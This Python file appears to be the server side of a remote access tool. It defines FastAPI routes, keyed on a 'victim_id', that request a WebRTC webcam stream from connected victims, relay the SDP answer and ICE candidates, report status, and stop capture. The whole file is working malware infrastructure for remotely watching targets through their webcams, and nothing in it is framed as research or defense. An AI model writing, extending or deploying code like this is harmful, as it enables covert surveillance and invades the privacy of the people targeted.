"""Bounded WebRTC webcam signaling routes."""

from .private_common import (
    APIRouter,
    BaseModel,
    ConfigDict,
    Depends,
    Field,
    HTTPException,
    Literal,
    Query,
    logger,
    verify_api_token,
    ws_manager,
)

api_router = APIRouter()

WEBCAM_SESSION_PATTERN = r"^[A-Za-z0-9_-]+$"


class StrictWebcamModel(BaseModel):
    model_config = ConfigDict(extra="forbid", strict=True)


class RTCAnswer(StrictWebcamModel):
    type: Literal["answer"]
    sdp: str = Field(min_length=1, max_length=64 * 1024)


class RTCIceCandidate(StrictWebcamModel):
    candidate: str = Field(min_length=1, max_length=8 * 1024)
    sdpMid: str | None = Field(default=None, max_length=256)
    sdpMLineIndex: int | None = Field(default=None, ge=0, le=65_535)
    usernameFragment: str | None = Field(default=None, max_length=256)


class WebRTCAnswer(StrictWebcamModel):
    session_id: str = Field(
        min_length=20,
        max_length=128,
        pattern=WEBCAM_SESSION_PATTERN,
    )
    answer: RTCAnswer


class ICECandidate(StrictWebcamModel):
    session_id: str = Field(
        min_length=20,
        max_length=128,
        pattern=WEBCAM_SESSION_PATTERN,
    )
    candidate: RTCIceCandidate


class WebcamRequest(StrictWebcamModel):
    session_id: str = Field(
        min_length=20,
        max_length=128,
        pattern=WEBCAM_SESSION_PATTERN,
    )


class WebcamStopRequest(StrictWebcamModel):
    session_id: str = Field(
        min_length=20,
        max_length=128,
        pattern=WEBCAM_SESSION_PATTERN,
    )


@api_router.post("/sessions/{victim_id}/webcam/request-offer")
async def request_webcam_offer(
    victim_id: str,
    payload: WebcamRequest,
    auth: str = Depends(verify_api_token)
):
    """Request WebRTC offer from victim for webcam stream"""

    # Check if victim is connected
    if not ws_manager.is_victim_connected(victim_id):
        logger.warning(f"⚠️ Victim {victim_id} not connected")
        raise HTTPException(status_code=404, detail="Victim not connected")

    logger.info(f"📤 Requesting webcam offer from victim {victim_id}")

    # Request offer with timeout
    offer = await ws_manager.request_webcam_offer(
        victim_id,
        payload.session_id,
        timeout=10,
    )

    if not offer:
        logger.error(f"⏱️ Timeout: No offer from victim {victim_id}")
        raise HTTPException(status_code=408, detail="Offer timeout or victim didn't respond")
    if offer.get("error"):
        detail = {
            "permission-denied": "Webcam access was denied",
            "device-unavailable": "No webcam is available",
            "capture-failed": "Unable to capture the webcam",
            "signaling-failed": "Webcam signaling failed",
        }.get(offer["error"], "Webcam request failed")
        status_code = 403 if offer["error"] == "permission-denied" else 409
        raise HTTPException(status_code=status_code, detail=detail)

    logger.info(f"✅ Received offer from victim {victim_id}")

    return {
        "victim_id": victim_id,
        "offer": offer['offer'],
        "timestamp": offer['timestamp'],
        "session_id": offer["session_id"],
    }


@api_router.post("/sessions/{victim_id}/webcam/send-answer")
async def send_webcam_answer(
    victim_id: str,
    payload: WebRTCAnswer,
    auth: str = Depends(verify_api_token)
):
    """Send WebRTC answer to victim"""

    if not ws_manager.is_victim_connected(victim_id):
        logger.warning(f"⚠️ Victim {victim_id} not connected")
        raise HTTPException(status_code=404, detail="Victim not connected")

    logger.info(f"📥 Sending WebRTC answer to victim {victim_id}")

    success = await ws_manager.send_webcam_answer(
        victim_id,
        payload.session_id,
        payload.answer.model_dump(),
    )

    if not success:
        logger.warning("Rejected stale webcam answer for victim %s", victim_id)
        raise HTTPException(status_code=409, detail="Webcam session is no longer active")

    logger.info(f"✅ Answer sent to victim {victim_id}")

    return {
        "status": "ok",
        "victim_id": victim_id,
        "session_id": payload.session_id,
    }


@api_router.post("/sessions/{victim_id}/webcam/ice-candidate")
async def send_ice_candidate(
    victim_id: str,
    payload: ICECandidate,
    auth: str = Depends(verify_api_token)
):
    """Send ICE candidate to victim"""

    if not ws_manager.is_victim_connected(victim_id):
        logger.warning(f"⚠️ Victim {victim_id} not connected")
        raise HTTPException(status_code=404, detail="Victim not connected")

    logger.debug(f"🧊 Sending ICE candidate to victim {victim_id}")

    result = await ws_manager.send_ice_candidate_to_victim(
        victim_id,
        payload.session_id,
        payload.candidate.model_dump(),
    )

    if result == "limit":
        logger.warning("Rejected excess ICE candidates for victim %s", victim_id)
        raise HTTPException(status_code=429, detail="ICE candidate limit exceeded")
    if result == "stale":
        logger.warning("Rejected stale ICE candidate for victim %s", victim_id)
        raise HTTPException(status_code=409, detail="Webcam session is no longer active")

    return {"status": "ok", "session_id": payload.session_id}


@api_router.get("/sessions/{victim_id}/webcam/ice-candidates")
async def get_ice_candidates(
    victim_id: str,
    session_id: str = Query(
        min_length=20,
        max_length=128,
        pattern=WEBCAM_SESSION_PATTERN,
    ),
    auth: str = Depends(verify_api_token)
):
    """Get pending ICE candidates from victim"""

    logger.debug(f"📋 Retrieving ICE candidates for victim {victim_id}")

    candidates = await ws_manager.get_victim_ice_candidates(
        victim_id,
        session_id,
    )
    if candidates is None:
        raise HTTPException(status_code=409, detail="Webcam session is no longer active")

    return {
        "victim_id": victim_id,
        "session_id": session_id,
        "candidates": candidates,
        "count": len(candidates)
    }


@api_router.post("/sessions/{victim_id}/webcam/stop")
async def stop_webcam(
    victim_id: str,
    payload: WebcamStopRequest,
    auth: str = Depends(verify_api_token),
):
    """Stop webcam capture and discard all signaling state."""
    stopped = await ws_manager.stop_webcam_session(
        victim_id,
        payload.session_id,
    )
    return {
        "status": "stopped" if stopped else "already-stopped",
        "victim_id": victim_id,
    }


@api_router.get("/sessions/{victim_id}/webcam/status")
async def get_webcam_status(
    victim_id: str,
    auth: str = Depends(verify_api_token)
):
    """Get webcam stream status"""

    is_connected = ws_manager.is_victim_connected(victim_id)
    session_id = ws_manager.get_webcam_session_id(victim_id)
    has_offer = victim_id in ws_manager.webrtc_offers

    status = "ready" if is_connected and has_offer else \
             "waiting" if is_connected else \
             "offline"

    logger.debug(f"📊 Webcam status for {victim_id}: {status}")

    return {
        "victim_id": victim_id,
        "victim_connected": is_connected,
        "offer_available": has_offer,
        "session_id": session_id,
        "status": status
    }
